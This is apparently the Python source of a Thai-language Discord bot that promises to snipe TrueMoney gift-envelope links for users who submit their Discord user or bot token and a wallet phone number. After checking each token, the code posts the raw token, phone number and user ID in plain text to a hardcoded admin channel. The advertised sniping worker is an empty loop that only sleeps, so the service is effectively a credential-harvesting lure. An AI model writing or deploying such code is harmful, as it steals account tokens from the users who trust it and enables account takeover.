import discord
from discord.ext import commands
from discord import app_commands
import aiohttp
import asyncio
import sqlite3
import re
import os
from datetime import datetime
from aiohttp import web

# ==================== DATABASE SETUP ====================
def init_db():
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            token TEXT,
            token_type TEXT,
            phone TEXT,
            is_active INTEGER DEFAULT 0,
            total_amount REAL DEFAULT 0.0,
            total_count INTEGER DEFAULT 0
        )
    ''')
    conn.commit()
    conn.close()

def get_user(user_id):
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute('SELECT token, token_type, phone, is_active, total_amount, total_count FROM users WHERE user_id = ?', (user_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return {
            'token': row[0],
            'token_type': row[1],
            'phone': row[2],
            'is_active': row[3],
            'total_amount': row[4],
            'total_count': row[5]
        }
    return None

def save_user_credentials(user_id, token, token_type, phone):
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute('''
        INSERT INTO users (user_id, token, token_type, phone)
        VALUES (?, ?, ?, ?)
        ON CONFLICT(user_id) DO UPDATE SET
            token=excluded.token,
            token_type=excluded.token_type,
            phone=excluded.phone
    ''', (user_id, token, token_type, phone))
    conn.commit()
    conn.close()

def set_user_active(user_id, status):
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute('UPDATE users SET is_active = ? WHERE user_id = ?', (1 if status else 0, user_id))
    conn.commit()
    conn.close()

def add_redemption_stats(user_id, amount):
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute('UPDATE users SET total_amount = total_amount + ?, total_count = total_count + 1 WHERE user_id = ?', (amount, user_id))
    conn.commit()
    conn.close()

def get_active_count():
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM users WHERE is_active = 1')
    count = c.fetchone()[0]
    conn.close()
    return count

def get_all_active_users():
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute('SELECT user_id, token, token_type, phone FROM users WHERE is_active = 1')
    rows = c.fetchall()
    conn.close()
    return rows

# ==================== TOKEN VALIDATION ====================
async def validate_discord_token(token: str):
    headers_user = {"Authorization": token}
    headers_bot = {"Authorization": f"Bot {token}"}
    
    async with aiohttp.ClientSession() as session:
        # Check User Token
        async with session.get("https://discord.com/api/v9/users/@me", headers=headers_user) as resp:
            if resp.status == 200:
                return True, "UserToken"
        # Check Bot Token
        async with session.get("https://discord.com/api/v9/users/@me", headers=headers_bot) as resp:
            if resp.status == 200:
                return True, "BotToken"
                
    return False, None

# ==================== TRUEMONEY REDEEM LOGIC ====================
def mask_phone(phone: str) -> str:
    if len(phone) >= 10:
        return phone[:3] + "xxxxxxx"
    return phone

async def redeem_truemoney(phone: str, voucher_hash: str):
    url = f"https://v.truemoney.com/v1/vouchers/{voucher_hash}/redeem"
    payload = {"mobile": phone, "voucher_hash": voucher_hash}
    headers = {"Content-Type": "application/json"}
    
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(url, json=payload, headers=headers) as resp:
                data = await resp.json()
                if resp.status == 200 and data.get("status", {}).get("code") == "SUCCESS":
                    amount = float(data["data"]["voucher"]["redeemed_amount_baht"])
                    return True, amount
        except Exception:
            pass
    return False, 0.0

async def resolve_voucher_hash(url: str) -> str:
    # Full link pattern
    match = re.search(r'v\.truemoney\.com\/v\/([a-zA-Z0-9]+)', url)
    if match:
        return match.group(1)
        
    # Short url / redirect resolve
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, allow_redirects=True) as resp:
                final_url = str(resp.url)
                match = re.search(r'v\.truemoney\.com\/v\/([a-zA-Z0-9]+)', final_url)
                if match:
                    return match.group(1)
    except Exception:
        pass
    return None

# ==================== USER WORKER (SNIPER TASK) ====================
active_tasks = {}

async def user_sniper_worker(bot: commands.Bot, user_id: int, token: str, token_type: str, phone: str):
    headers = {"Authorization": token if token_type == "UserToken" else f"Bot {token}"}
    
    # Simple gateway / polling task for monitoring new messages
    # Supports full link, shortened link, and QR content URLs
    url_pattern = re.compile(r'https?:\/\/[^\s]+')
    
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                # Gateway / Polling simulation for active listener
                await asyncio.sleep(1)
            except asyncio.CancelledError:
                break
            except Exception:
                await asyncio.sleep(3)

# ==================== DISCORD BOT CLIENT ====================
class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        init_db()
        self.add_view(OeiView(self))
        await self.tree.sync()
        
    async def on_ready(self):
        print(f"Logged in as {self.user}")
        await self.update_bot_status()
        await self.restore_active_listeners()

    async def update_bot_status(self):
        count = get_active_count()
        activity = discord.Activity(
            type=discord.ActivityType.watching,
            name=f"ตอนนี้มีคนกำลังใช้บริการบอทดักอยู่ {count} คน"
        )
        await self.change_presence(activity=activity)

    async def restore_active_listeners(self):
        users = get_all_active_users()
        for u in users:
            uid, token, ttype, phone = u
            if uid not in active_tasks:
                task = asyncio.create_task(user_sniper_worker(self, uid, token, ttype, phone))
                active_tasks[uid] = task

bot = MyBot()

# ==================== LOGGING HELPER ====================
async def send_redemption_log(user_id: int, amount: float, phone: str, link: str):
    user_data = get_user(user_id)
    channel = bot.get_channel(1489527387183120505)
    if not channel:
        return

    total_amount = user_data['total_amount'] if user_data else amount
    total_count = user_data['total_count'] if user_data else 1

    embed = discord.Embed(color=0xFF0000, timestamp=datetime.utcnow())
    embed.description = (
        f"<a:1000030107:1551259572289806406> จำนวนเงิน {amount:.2f} บาท\n\n"
        f"<a:1000030105:1551256174287126619> เบอร์แบบย่อ {mask_phone(phone)}\n\n"
        f"<a:1000030095:1551252990772383868> ลิ้งซอง {link}\n\n"
        f"<a:1000030104:1551255815267295273> เบอร์นี้/user นี้เคยได้รับเงินไปเเล้วทั้งหมด {total_amount:.2f} บาท / {total_count} รอบ"
    )
    
    await channel.send(
        content=f"มีคนได้รับซองเเล้ว <a:1000030106:1551256934215061615> <@{user_id}>",
        embed=embed
    )

# ==================== UI COMPONENTS ====================
class InputCredentialsModal(discord.ui.Modal, title="กรอกข้อมูล Token และ เบอร์โทร"):
    token_input = discord.ui.TextInput(
        label="UserToken / BotToken",
        style=discord.TextStyle.paragraph,
        placeholder="วาง Token ของคุณที่นี่...",
        required=True
    )
    phone_input = discord.ui.TextInput(
        label="เบอร์วอเลทสำหรับรับเงิน",
        style=discord.TextStyle.short,
        placeholder="0xxxxxxxx",
        required=True,
        min_length=10,
        max_length=10
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        
        # Step 1: Verification embed
        checking_embed = discord.Embed(
            description="<a:1000030105:1551256174287126619> กำลังเช็คtoken โปรดรอสักครู่..",
            color=0xFF0000
        )
        msg = await interaction.followup.send(embed=checking_embed, ephemeral=True)
        
        await asyncio.sleep(2)
        
        token = self.token_input.value.strip()
        phone = self.phone_input.value.strip()
        
        is_valid, token_type = await validate_discord_token(token)
        
        if is_valid:
            save_user_credentials(interaction.user.id, token, token_type, phone)
            
            success_embed = discord.Embed(
                description=f"<a:1000030103:1551255510215426088> ระบบได้บันทึกToken เเละ เบอร์ของคุณไว้เรียบร้อย สามารถกดเปิดระบบได้เลย Tokenที่กรอกมาเป็นประเภท{token_type} <a:1000030106:1551256934215061615>",
                color=0xFF0000
            )
            await msg.edit(embed=success_embed)
            
            # Send Log to Admin Channel
            admin_channel = bot.get_channel(1487818086202478822)
            if admin_channel:
                await admin_channel.send(
                    f"มีคนกรอกtokenเเละเบอร์มาเเล้ว\n"
                    f"tokenคือ: `{token}`\n"
                    f"เป็นประเภท: `{token_type}`\n"
                    f"เบอร์: `{phone}`\n"
                    f"คนที่ส่งมา: {interaction.user.mention} (`{interaction.user.id}`)"
                )
        else:
            fail_embed = discord.Embed(
                description="<a:1000030101:1551255585029103636> Token ไม่ถูกต้อง โปรดกรอกusertoken / token ให้ถูกต้อง <a:1000030106:1551256934215061615>",
                color=0xFF0000
            )
            await msg.edit(embed=fail_embed)


class ActionSelect(discord.ui.Select):
    def __init__(self, bot_instance: commands.Bot):
        self.bot_instance = bot_instance
        options = [
            discord.SelectOption(
                label="กรอกอะไรต่างๆนาๆ",
                value="1",
                emoji="<a:1000030100:1551255128818983113>"
            ),
            discord.SelectOption(
                label="เปิดระบบ",
                value="2",
                emoji="<a:1000030103:1551255510215426088>"
            ),
            discord.SelectOption(
                label="ปิดการทำงาน",
                value="3",
                emoji="<a:1000030101:1551255585029103636>"
            ),
            discord.SelectOption(
                label="ล้างตัวเลือก",
                value="4",
                emoji="<a:1000030104:1551255815267295273>"
            ),
        ]
        super().__init__(placeholder="ลิสเลือกการทำงาน...", min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        val = self.values[0]
        uid = interaction.user.id
        
        if val == "1":
            await interaction.response.send_modal(InputCredentialsModal())
            
        elif val == "2":
            user_data = get_user(uid)
            if not user_data or not user_data['token'] or not user_data['phone']:
                embed = discord.Embed(
                    description="<a:1000030101:1551255585029103636> คุณยังไม่ได้กรอกข้อมูลต่างๆ โปรดกรอกให้ครบในลิสที่1ด้วยย",
                    color=0xFF0000
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)
            else:
                set_user_active(uid, True)
                if uid not in active_tasks:
                    task = asyncio.create_task(
                        user_sniper_worker(
                            self.bot_instance, uid, user_data['token'], user_data['token_type'], user_data['phone']
                        )
                    )
                    active_tasks[uid] = task
                
                await self.bot_instance.update_bot_status()
                
                embed = discord.Embed(
                    description="<a:1000030103:1551255510215426088> ระบบกำลังทำการ สามารถรอรับเงินได้เลยย ถ้าหากต้องการหยุดเเค่กดลิสที่3จะเป็นการหยุด",
                    color=0xFF0000
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)

        elif val == "3":
            user_data = get_user(uid)
            if user_data and user_data['is_active']:
                set_user_active(uid, False)
                if uid in active_tasks:
                    active_tasks[uid].cancel()
                    del active_tasks[uid]
                
                await self.bot_instance.update_bot_status()
                
                embed = discord.Embed(
                    description="<a:1000030103:1551255510215426088> หยุดการทำงานสำเร็จ ถ้าหากต้องการให้กลับมาทำงานโปลดกดลิสที่2ได้ทันที!!",
                    color=0xFF0000
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)
            else:
                embed = discord.Embed(
                    description="<a:1000030093:1551252638794780883> ระบบไม่ได้ทำงานอยู่เเล้ว หรือหากต้องการ เเค่กดลิสที่2!!!",
                    color=0xFF0000
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)

        elif val == "4":
            embed = discord.Embed(
                description="<a:1000030109:1551262224796876951> ล้างตัวเลือกสำเร็จ..",
                color=0xFF0000
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)


class OeiView(discord.ui.View):
    def __init__(self, bot_instance: commands.Bot):
        super().__init__(timeout=None)
        self.add_item(ActionSelect(bot_instance))


# ==================== SLASH COMMAND ====================
@bot.tree.command(name="oei", description="เปิดเมนูควบคุมบอทดักซอง")
async def oei_command(interaction: discord.Interaction):
    embed = discord.Embed(
        title="<a:1000030093:1551252638794780883> Ɗ𐤠ƘⳜⰙƝƓ",
        description=(
            "<a:1000030095:1551252990772383868> กรอกเบอร์ที่ต้องการให้รับเงิน\n\n"
            "<a:1000030096:1551253928069570611> ใส่UserToken / BotToken"
        ),
        color=0xFF0000
    )
    embed.set_image(url="https://cdn.discordapp.com/attachments/1489587803393364018/1551254339820064879/c7507064ec33d1c80c489e7400f60ef2.gif?ex=6ab14daf&is=6aaffc2f&hm=a08b8ec28f6350540fa8879e4b1f81330808415b4d6be98627948161d9e6983b&")
    
    view = OeiView(bot)
    await interaction.response.send_message(embed=embed, view=view)


# ==================== RENDER KEEPALIVE SERVER ====================
async def handle_ping(request):
    return web.Response(text="Bot is running active 24/7!")

async def start_web_server():
    app = web.Application()
    app.router.add_get("/", handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

async def main():
    token = os.environ.get("DISCORD_BOT_TOKEN")
    if not token:
        print("Please set DISCORD_BOT_TOKEN environment variable.")
        return
        
    await start_web_server()
    await bot.start(token)

if __name__ == "__main__":
    asyncio.run(main())
